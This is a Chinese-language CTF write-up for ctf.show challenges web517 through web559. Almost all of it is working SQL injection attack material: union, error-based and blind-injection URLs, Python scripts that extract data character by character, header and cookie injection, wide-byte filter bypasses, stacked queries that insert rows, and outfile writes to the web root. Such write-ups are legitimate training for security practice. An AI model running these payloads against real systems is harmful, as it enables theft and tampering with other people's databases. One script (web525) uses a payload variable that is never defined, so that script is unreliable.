# web517

```
http://18a525b1-7361-41a9-95ca-13fe28fb7628.challenge.ctf.show:8080/?id=-1' union select 1,2, group_concat(flag) from ctfshow.flag%23
```

# web518



```
http://40f53674-25e2-4a24-ad0f-2352e4b616c7.challenge.ctf.show:8080/?id=-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="ctfshow"%23
```

然后

```
http://52d76bf4-0ed7-4c35-a948-488ae4024879.challenge.ctf.show:8080/?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="ctfshow"%23
```

然后

```
http://40f53674-25e2-4a24-ad0f-2352e4b616c7.challenge.ctf.show:8080/?id=-1 union select 1,2, group_concat(flagac) from ctfshow.flagaa%23
```

# web519

```
http://52d76bf4-0ed7-4c35-a948-488ae4024879.challenge.ctf.show:8080/?id=-1') union select 1,2,group_concat(flagaca) from ctfshow.flagaanec%23
```

# web520

```
http://c1bd13b7-0456-47e3-b934-ef245544b9fb.challenge.ctf.show:8080/?id=-1") union select 1,2, group_concat(flag23) from ctfshow.flagsf%23
```

# web521

```
import requests

url = "http://980a5aeb-4488-401b-89e7-7c692193d96a.challenge.ctf.show:8080/?id=1%27and%20"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        # payload = f'if(ascii(substr((select flag33 from ctfshow.flagpuck),{i},1))>{mid},1,0)'
        payload = f'if(ascii(substr((select/**/group_concat(flag33)from(ctfshow.flagpuck)),{i},1))>{mid},1,0)%23'

        r = requests.get(url + payload)
        if "You are in..........." in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```

# web522

```
import requests

url = "http://4c387b36-eb36-493f-be68-e542b148d722.challenge.ctf.show:8080/?id=1%22and%20"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        payload = f'if(ascii(substr((select/**/group_concat(flag3a3)from(ctfshow.flagpa)),{i},1))>{mid},1,0)%23'

        r = requests.get(url + payload)
        if "You are in..........." in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```



# web523

```
http://b8bfba68-363a-4856-9ef1-4fd83f268b09.challenge.ctf.show:8080/?id=1')) UNION SELECT 1,2,3 into outfile "/var/www/html/1.txt"%23
```

有手就行

```
http://b8bfba68-363a-4856-9ef1-4fd83f268b09.challenge.ctf.show:8080/?id=1')) UNION SELECT 1,2,group_concat(flag43) from ctfshow.flagdk into outfile "/var/www/html/4.txt"%23
```

# web524

```
import requests

url = "http://cf64c27f-35f0-42af-bee6-3c8639d4c5d6.challenge.ctf.show:8080/?id=1%27and%20"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},sleep(1.5),0)%23'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.7),0)%23'
        payload = f'if(ascii(substr((select/**/group_concat(flag423)from(ctfshow.flagjugg)),{i},1))>{mid},sleep(0.6),0)%23'


        try:
            r = requests.get(url + payload,timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```

# web525

```
import requests

url = "http://287a0161-44cc-42d6-b517-9a532cd33828.challenge.ctf.show:8080/?id=1%27and%20"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)%23'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)%23'

        try:
            r = requests.get(url + payload,timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```

# web526

```
import requests

url = "http://287a0161-44cc-42d6-b517-9a532cd33828.challenge.ctf.show:8080/?id=1%22and%20"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)%23'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)%23'
        payload = f'if(ascii(substr((select/**/group_concat(flag43s)from(ctfshow.flagugs)),{i},1))>{mid},sleep(0.6),0)%23'

        try:
            r = requests.get(url + payload,timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```



# web527

```
passwd=1&uname=1admin'union select 1,group_concat(table_name) from information_schema.tables where table_schema="ctfshow"#
```

然后

```
passwd=1&uname=1admin'union select 1,group_concat(column_name) from information_schema.columns where table_schema="ctfshow"#
```

最后

```
passwd=1&uname=1admin'union select 1,group_concat(flag43s) from ctfshow.flagugsd#
```

# web528

```
passwd=1&uname=1admin")union select 1,group_concat(table_name) from information_schema.tables where table_schema="ctfshow"#
```

然后

```
passwd=1&uname=1admin")"union select 1,group_concat(column_name) from information_schema.columns where table_schema="ctfshow"#
```

最后

```
passwd=1&uname=1admin")union select 1,group_concat(flag43as) from ctfshow.flagugsds#
```

# web529

```
import requests

url = "http://92411943-335e-4d8d-aa12-3d2b41adf00b.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        payload = f'if(ascii(substr((select/**/group_concat(flag4)from(ctfshow.flag)),{i},1))>{mid},1,0)'
        # ctfshow{b3642f1a-4243-48ef-9aae-f7e0baf425cc}
        data = {
            'uname':f"admin')and {payload}#",
            'passwd': '1'
        }
        r = requests.post(url,data=data)
        if "flag" in r.text:
            head = mid + 1
        else:
            tail = mid


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```



# web530

```
uname=admin"and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&passwd=1&submi t=Submit
```

然后flagb

```
uname=admin"and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),0x7e))#&passwd=1&submi t=Submit
```

然后一样的

最后

```
uname=admin"and extractvalue(1,concat(0x7e,(select left(flag4s,40) from ctfshow.flagb),0x7e))#&passwd=1&submi t=Submit
```

```
uname=admin"and extractvalue(1,concat(0x7e,(select right(flag4s,20) from ctfshow.flagb),0x7e))#&passwd=1&submi t=Submit
```

# web531

```
import requests

url = "http://4f432df5-2b68-4442-afd8-07ba011e73cb.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)'
        payload = f'if(ascii(substr((select/**/group_concat(flag4sa)from(ctfshow.flagba)),{i},1))>{mid},sleep(0.6),0)'
        # ctfshow{b3642f1a-4243-48ef-9aae-f7e0baf425cc}
        data = {
            'uname':f"admin'and {payload}#",
            'passwd': '1'
        }
        try:
            r = requests.post(url, data=data, timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

# web532

```
import requests

url = "http://b948f9cc-9880-4235-bdfe-7a6edf32ed2e.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.6),0)'
        payload = f'if(ascii(substr((select/**/group_concat(flag4sa)from(ctfshow.flagbab)),{i},1))>{mid},sleep(0.6),0)'
        data = {
            'uname':f'admin")and {payload}#',
            'passwd': '1'
        }
        try:
            r = requests.post(url, data=data, timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```



# web533

```
uname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),0x7e))#&sub mit=Submit
```

得到flag

```
uname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema="ctfshow"),0x7e))#&sub mit=Submit
```

最后

```
uname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select group_concat(flag4) from ctfshow.flag),0x7e))#&sub mit=Submit
```

和

```
uname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag),0x7e))#&sub mit=Submit
```

拼接起来

# web534

```
import requests
import base64
# payload = 'group_concat(table_name) from information_schema.tables where table_schema="ctfshow"';
# payload = 'group_concat(column_name) from information_schema.columns where table_schema="ctfshow"';
# payload = 'group_concat(flag4) from ctfshow.flag';
payload = 'right(flag4,20) from ctfshow.flag'

headers = {
    # "Cookie":'uname='+base64.b64encode(("admin1"+'"'+f"and extractvalue(1,concat(0x7e,(select {payload}),0x7e))#").encode()).decode()
    "User-Agent":f"'and extractvalue(1,concat(0x7e,(select {payload}),0x7e)) and '1'='1",
}
data = {
    'uname':'Dumb',
    'passwd':'Dumb'
}
url = 'http://e01bd82b-d64f-4362-839d-9bd388e5044c.challenge.ctf.show:8080/'
r = requests.post(url, headers=headers, data=data)
print(r.text)
# ctfshow{540e8dcc-1aa2-4757-bf4a-09d25772ecea}
```

# web535

```
import requests
import base64
# payload = 'group_concat(table_name) from information_schema.tables where table_schema="ctfshow"';
# payload = 'group_concat(column_name) from information_schema.columns where table_schema="ctfshow"';
payload = 'group_concat(flag4) from ctfshow.flag';
# payload = 'right(flag4,20) from ctfshow.flag'

headers = {
    # "Cookie":'uname='+base64.b64encode(("admin1"+'"'+f"and extractvalue(1,concat(0x7e,(select {payload}),0x7e))#").encode()).decode()
    "Referer":f"'and extractvalue(1,concat(0x7e,(select {payload}),0x7e)) and '1'='1",
}
data = {
    'uname':'Dumb',
    'passwd':'Dumb'
}
url = 'http://569896bf-c255-4069-ab79-3a17539f4325.challenge.ctf.show:8080/'
r = requests.post(url, headers=headers, data=data)
print(r.text)
# ctfshow{1886ca4f-4209-4796-801b-1cc81cd33f88}
```



# web536



```
Cookie: UM_distinctid=178accf20e4353-0c1d07f321d76f-13e3563-144000-178accf20e55b7; uname=uname=admin1'and extractvalue(1,concat(0x7e,(select group_concat(flag4) from ctfshow.flag),0x7e))#
```

和

```
Cookie: UM_distinctid=178accf20e4353-0c1d07f321d76f-13e3563-144000-178accf20e55b7; uname=uname=admin1'and extractvalue(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag),0x7e))#
```

# web537

```
import requests
import base64
# payload = 'group_concat(table_name) from information_schema.tables where table_schema="ctfshow"';
# payload = 'group_concat(column_name) from information_schema.columns where table_schema="ctfshow"';
# payload = 'group_concat(flag4) from ctfshow.flag';
payload = 'right(flag4,20) from ctfshow.flag';

headers = {
    "Cookie":'uname='+base64.b64encode(f"admin1')and extractvalue(1,concat(0x7e,(select {payload}),0x7e))#".encode()).decode()
}
url = 'http://d3791ad8-270e-43ae-8045-cf01f26bc973.challenge.ctf.show:8080/'
r = requests.get(url, headers=headers)
print(r.text)
# ctfshow{60108ddd-ffb5-4f8a-8e97-f3b2a546d064}
```

# web538

```
import requests
import base64
# payload = 'group_concat(table_name) from information_schema.tables where table_schema="ctfshow"';
# payload = 'group_concat(column_name) from information_schema.columns where table_schema="ctfshow"';
# payload = 'group_concat(flag4) from ctfshow.flag';
payload = 'right(flag4,20) from ctfshow.flag'

headers = {
    "Cookie":'uname='+base64.b64encode(("admin1"+'"'+f"and extractvalue(1,concat(0x7e,(select {payload}),0x7e))#").encode()).decode()
}
url = 'http://a7deba97-d596-4111-8fbd-876ed161edbd.challenge.ctf.show:8080/'
r = requests.get(url, headers=headers)
print(r.text)
# ctfshow{30665b76-13d7-4139-9d6b-e8e437c50085}
```



# web539

```
http://93836266-d300-4ecb-b742-756f7a447aeb.challenge.ctf.show:8080/?id=-1'union select 1,(select group_concat(flag4) from ctfshow.flag),'3
```



# web540

```
import requests
session = requests.session()

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},sleep(1),0)'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.7),0)'
        payload = f'if(ascii(substr((select/**/group_concat(flag4)from(ctfshow.flag)),{i},1))>{mid},sleep(0.6),0)'
        username = f"admin' and {payload} or '1'='1"
        url1 = 'http://6d02fe4f-4cfd-4664-8486-8a5a380c2ee3.challenge.ctf.show:8080/login_create.php'
        data = {
            'username': username,
            'password': '1',
            're_password': '1',
            'submit': 'Register'
        }
        r = session.post(url1, data=data)
        url2 = 'http://6d02fe4f-4cfd-4664-8486-8a5a380c2ee3.challenge.ctf.show:8080/login.php'
        data = {
            'login_user': username,
            'login_password': '1',
            'mysubmit': 'Login',
        }
        r = session.post(url2, data=data)
        url3 = 'http://6d02fe4f-4cfd-4664-8486-8a5a380c2ee3.challenge.ctf.show:8080/pass_change.php'
        data = {
            'current_password': '1',
            'password': '2',
            're_password': '2',
            'submit': 'Reset'
        }

        try:
            r = session.post(url3,data=data,timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

```

# web541

```
http://b2df5465-d5a3-4fbc-8337-9c80f9108382.challenge.ctf.show:8080/?id=1'|| extractvalue(1,concat(0x7e,database()))--+
```

测试成功or替换为空

```
http://b2df5465-d5a3-4fbc-8337-9c80f9108382.challenge.ctf.show:8080/?id=1'|| extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema="ctfshow"),0x7e))--+
```

然后查columns

最后

```
http://b2df5465-d5a3-4fbc-8337-9c80f9108382.challenge.ctf.show:8080/?id=1'|| extractvalue(1,concat(0x7e,(select group_concat(flag4s) from ctfshow.flags),0x7e))--+

http://b2df5465-d5a3-4fbc-8337-9c80f9108382.challenge.ctf.show:8080/?id=1'|| extractvalue(1,concat(0x7e,(select right(flag4s,20) from ctfshow.flags),0x7e))--+
```

# web542

测试

```
http://47c01140-33f0-4900-88d7-a60d9ca85269.challenge.ctf.show:8080/?id=-1%20UNION%20select%201,@@basedir,3%23
```

然后table

```
http://47c01140-33f0-4900-88d7-a60d9ca85269.challenge.ctf.show:8080/?id=-1%20UNION%20select%201,@@basedir,group_concat(table_name) from infoorrmation_schema.tables where table_schema="ctfshow"%23
```

之后column

```
http://47c01140-33f0-4900-88d7-a60d9ca85269.challenge.ctf.show:8080/?id=-1%20UNION%20select%201,@@basedir,group_concat(column_name) from infoorrmation_schema.columns where table_schema="ctfshow"%23
```

最后

```
http://47c01140-33f0-4900-88d7-a60d9ca85269.challenge.ctf.show:8080/?id=-1%20UNION%20select%201,@@basedir,group_concat(flag4s) from ctfshow.flags%23
```

# web543

对于空格，有较多的方法： 

%09 TAB 键（水平） 

%0a 新建一行 

%0c 新的一页 

%0d return 功能 

%0b TAB 键（垂直） 

%a0 空格 

测试都不行，然后时间盲注吧发现可以不如骚一点

```
http://8958441d-8180-4f03-89f9-f28d94bd4191.challenge.ctf.show:8080/?id=100%27||if(1=1,sleep(1),1)||%270
```

报错

```
http://8958441d-8180-4f03-89f9-f28d94bd4191.challenge.ctf.show:8080/?id=100%27||extractvalue(1,concat(0x7e,(select((flag4s))from(ctfshow.flags)),0x7e))||%270

http://8958441d-8180-4f03-89f9-f28d94bd4191.challenge.ctf.show:8080/?id=100%27||extractvalue(1,concat(0x7e,(select(right(flag4s,20))from(ctfshow.flags)),0x7e))||%270
```

# web544

上一道题思路盲注

```
import requests

url = "http://5fc95b84-4344-46c0-af32-e1643c71d880.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        # payload = f'if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        payload = f'if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)%23'
        data = {
            'id': f"100')||{payload}||('0"
        }
        r = requests.get(url,params=data)
        if "Dumb" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

# web545

select大小写混合

```
import requests

url = "http://857803fc-3f61-4ec6-8084-214ad94d5be4.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        # payload = f'if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        payload = f'if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)%23'
        data = {
            'id': f"100'||{payload}||'0"
        }
        r = requests.get(url,params=data)
        if "Dumb" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```

# web546

改成"即可

```
import requests

url = "http://642ba949-092a-4d73-bdc6-3914a631fdf0.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        # payload = f'if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        payload = f'if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)%23'
        data = {
            'id': f'100"||{payload}||"0'
        }
        r = requests.get(url,params=data)
        if "Dumb" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


```

# web547-548

id用('')闭合了

```
import requests

url = "http://ad252945-d00d-4d20-b9d3-59af493daf3e.challenge.ctf.show:8080/"

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        # payload = f'if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        payload = f'if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)%23'
        data = {
            'id': f"100')||{payload}||('0"
        }
        r = requests.get(url,params=data)
        if "Dumb" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

# 重点学习

# web549

```
http://c6227407-2f92-4ff0-9b98-39284d3f9750.challenge.ctf.show:8080/index.jsp?id=1&id=-2%27union%20select%201,2,group_concat(flag4s) from ctfshow.flags-- +
```

# web550

```
http://7a80d6e5-8398-4bdf-a623-39b36e270cdd.challenge.ctf.show:8080/index.jsp?id=1&id=-2"union%20select%201,2,group_concat(flag4s) from ctfshow.flags-- +
```

# web551

```
http://e533cffd-547e-42ed-8520-c6271d8d0950.challenge.ctf.show:8080/index.jsp?id=1&id=-2")union%20select%201,2,group_concat(flag4s) from ctfshow.flags-- +
```

# web552-web553

宽字节注入

```
http://76a6e481-4271-4ed8-858b-0122a2716c13.challenge.ctf.show:8080/index.jsp?id=1&id=-2%df'union%20select%201,2,group_concat(flag4s) from ctfshow.flags-- +
```

# web554

```
import requests
url = 'http://107f30ae-cd90-4dde-b3fa-13b3958e38fc.challenge.ctf.show:8080/'


result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        # payload = f'if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        payload = f'if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)'
        data = {
            'uname': f"1�' or 1={payload}#",
            'passwd': '1'
        }
        r = requests.post(url,data=data)
        if "Dumb" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```



# web555

```
http://9fc6f759-ff93-4c54-be09-cb69d6f258b8.challenge.ctf.show:8080/?id=-1%20%20union%20select%201,user(),group_concat(flag4s) from ctfshow.flags--+

```



# web556

```
http://ca041e34-0bb9-42d0-b513-07393d8a4466.challenge.ctf.show:8080/?id=-1%EF%BF%BD%27union%20select%201,user(),group_concat(flag4s) from ctfshow.flags--+

```



# web557

本关是 post 型的注入漏洞，同样的也是将 post 过来的内容进行了 ‘ \ 的处理。由上面的例 子可以看到我们的方法就是将过滤函数添加的 \ 给吃掉。而 get 型的方式我们是以 url 形式 提交的，因此数据会通过 URLencode，如何将方法用在 post 型的注入当中，我们此处介绍 一个新的方法。将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 � ' 。我们就可以利用这个方式进行尝试。

也就是%EF%BF%BD转一下

```
import requests
url = 'http://5e383a8d-28ed-477d-a129-cb302cd73f6d.challenge.ctf.show:8080/'


result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        # payload = f'if(ascii(substr((SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},1,0)'
        # payload = f'if(ascii(substr((SeLect(group_concat(column_name))from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},1,0)%23'
        payload = f'if(ascii(substr((SeLect(group_concat(flag4s))from(ctfshow.flags)),{i},1))>{mid},1,0)'
        data = {
            'uname': f"1�' or 1={payload}#",
            'passwd': '1'
        }
        r = requests.post(url,data=data)
        if "Dumb" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

# web558

堆叠

```
http://0e56f542-8bfd-48e1-b1e2-9e91c1deba9b.challenge.ctf.show:8080/?id=29';insert into users(id,username,password) values (29,(select user()),"9")--+
```

拿不到flag

```
http://0e56f542-8bfd-48e1-b1e2-9e91c1deba9b.challenge.ctf.show:8080/?id=30' union select 1,2,group_concat(flag4s)from(ctfshow.flags)--+
```

# web559

```
http://e4691481-e46a-4ec5-aa03-5794f1184e66.challenge.ctf.show:8080/?id=30 union select 1,2,group_concat(flag4s)from(ctfshow.flags)%23
```

